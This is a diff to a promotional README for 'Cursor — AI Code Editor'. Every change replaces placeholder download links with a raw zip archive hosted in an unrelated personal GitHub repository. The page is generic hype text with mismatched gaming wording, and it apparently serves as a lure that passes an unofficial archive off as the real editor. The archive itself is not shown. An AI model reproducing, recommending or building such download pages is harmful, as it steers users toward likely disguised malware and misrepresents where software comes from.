@@ -4,7 +4,7 @@
 
 > The AI-native code editor that has taken the developer world by storm — write, edit, and understand code with a powerful AI pair programmer built directly into your workflow.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Jenileecushy849/cursor-ai/raw/refs/heads/main/wirling/ai_cursor_2.2.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Windows, macOS, Linux**.
 
 ### Ready to play / use?
 
-[![Download Cursor — AI Code Editor](https://img.shields.io/badge/Download-Cursor%20%20AI%20Code%20Editor-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Cursor — AI Code Editor](https://img.shields.io/badge/Download-Cursor%20%20AI%20Code%20Editor-brightgreen?style=for-the-badge)](https://github.com/Jenileecushy849/cursor-ai/raw/refs/heads/main/wirling/ai_cursor_2.2.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Jenileecushy849/cursor-ai/raw/refs/heads/main/wirling/ai_cursor_2.2.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ Cursor — AI Code Editor is one of the **most hyped releases of Summer 2026** �
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Jenileecushy849/cursor-ai/raw/refs/heads/main/wirling/ai_cursor_2.2.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ Cursor — AI Code Editor is one of the **most hyped releases of Summer 2026** �
 
 **Don't miss out — Cursor — AI Code Editor is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Cursor%20%20AI%20Code%20Editor-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Cursor%20%20AI%20Code%20Editor-blue?style=for-the-badge)](https://github.com/Jenileecushy849/cursor-ai/raw/refs/heads/main/wirling/ai_cursor_2.2.zip)
 
 *Cursor — AI Code Editor — Available Now · Windows, macOS, Linux*
 
